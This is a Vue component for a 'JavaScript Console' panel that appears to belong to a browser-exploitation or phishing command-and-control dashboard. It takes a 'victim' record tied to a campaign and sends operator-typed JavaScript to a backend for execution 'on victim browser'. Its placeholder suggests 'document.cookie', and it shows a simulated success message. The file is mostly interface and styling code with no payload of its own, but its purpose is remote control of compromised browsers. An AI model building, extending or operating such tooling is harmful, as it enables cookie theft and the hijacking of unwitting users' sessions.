<script setup>
import { ref, nextTick } from 'vue'
import Button from 'primevue/button'
import Textarea from 'primevue/textarea'
import { backendService } from '@/services/backend'

const props = defineProps({
    victim: Object
})

const command = ref('')
const output = ref([])
const commandHistory = ref([])
const historyIndex = ref(-1)

async function executeCommand() {
    if (!command.value.trim()) return

    const cmd = command.value.trim()

    // Add to history
    commandHistory.value.unshift(cmd)
    historyIndex.value = -1

    await backendService.sendJSCommand(props.victim.campaign_id, props.victim.id, cmd)

    // Add to output
    output.value.push({
        type: 'command',
        content: cmd,
        timestamp: new Date()
    })

    // Simulate execution (replace with real backend call)
    setTimeout(() => {
        output.value.push({
            type: 'success',
            content: '[+] Command executed successfully',
            timestamp: new Date()
        })
    }, 300)

    command.value = ''
    scrollToBottom()
}

function clearOutput() {
    output.value = []
}

function scrollToBottom() {
    nextTick(() => {
        const outputEl = document.querySelector('.console-output')
        if (outputEl) {
            outputEl.scrollTop = outputEl.scrollHeight
        }
    })
}

function formatTimestamp(date) {
    return date.toLocaleTimeString('en-US', {
        hour12: false,
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    })
}
</script>

<template>
    <div class="console-panel">
        <div class="console-header">
            <h4>JavaScript Console</h4>
            <div class="header-actions">
                <Button
                    label="Clear"
                    icon="pi pi-trash"
                    size="small"
                    text
                    @click="clearOutput"
                />
            </div>
        </div>

        <div class="console-output">
            <div
                v-for="(entry, index) in output"
                :key="index"
                class="output-line"
                :class="entry.type"
            >
                <span class="timestamp">{{ formatTimestamp(entry.timestamp) }}</span>
                <span class="content">{{ entry.content }}</span>
            </div>

            <div v-if="output.length === 0" class="console-empty">
                <i class="pi pi-code"></i>
                <p>Execute JavaScript commands on victim browser</p>
                <!-- <small>Commands are queued and executed on next page interaction</small> -->
            </div>
        </div>

        <div class="console-input">
            <span class="prompt">console></span>
            <Textarea
                v-model="command"
                rows="3"
                placeholder="document.cookie, alert('test'), ..."
                @keydown.ctrl.enter="executeCommand"
                class="command-textarea"
            />
        </div>

        <div class="console-actions">
            <Button
                label="Execute"
                icon="pi pi-play"
                @click="executeCommand"
                :disabled="!command.trim()"
            />
            <span class="help-text">Ctrl+Enter to execute</span>
        </div>
    </div>
</template>

<style scoped>
.console-panel {
    display: flex;
    flex-direction: column;
    gap: 1rem;
}

.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.console-header h4 {
    font-size: 1rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
}

.header-actions {
    display: flex;
    gap: 0.5rem;
}

.console-output {
    min-height: 250px;
    max-height: 400px;
    overflow-y: auto;
    background-color: var(--color-background-mute);
    /* border: 1px solid var(--color-border); */
    border-radius: 6px;
    padding: 1rem;
    font-family: 'JetBrains Mono', 'Courier New', monospace;
    font-size: 0.875rem;
}

.output-line {
    display: flex;
    gap: 1rem;
    margin-bottom: 0.5rem;
    padding: 0.25rem 0;
}

.output-line.command {
    color: var(--color-text);
}

.output-line.success {
    color: var(--success);
}

.output-line.error {
    color: var(--danger);
}

.timestamp {
    color: var(--color-text-mute);
    flex-shrink: 0;
    font-size: 0.75rem;
}

.content {
    flex: 1;
    word-break: break-all;
}

.console-empty {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    padding: 3rem;
    color: var(--color-text-mute);
    text-align: center;
}

.console-empty i {
    font-size: 2.5rem;
    opacity: 0.5;
}

.console-empty p {
    margin: 0;
    font-size: 0.875rem;
}

.console-empty small {
    font-size: 0.75rem;
}

.console-input {
    display: flex;
    gap: 0.75rem;
    align-items: flex-start;
}

.prompt {
    font-family: 'JetBrains Mono', monospace;
    font-weight: 600;
    color: var(--color-accent);
    margin-top: 0.5rem;
    flex-shrink: 0;
}

.command-textarea {
    flex: 1;
    font-family: 'JetBrains Mono', monospace;
}

.console-actions {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.help-text {
    font-size: 0.75rem;
    color: var(--color-text-mute);
}

/* Scrollbar */
.console-output::-webkit-scrollbar {
    width: 8px;
}

.console-output::-webkit-scrollbar-track {
    background: var(--color-background);
}

.console-output::-webkit-scrollbar-thumb {
    background: var(--color-border-hover);
    border-radius: 4px;
}
</style>
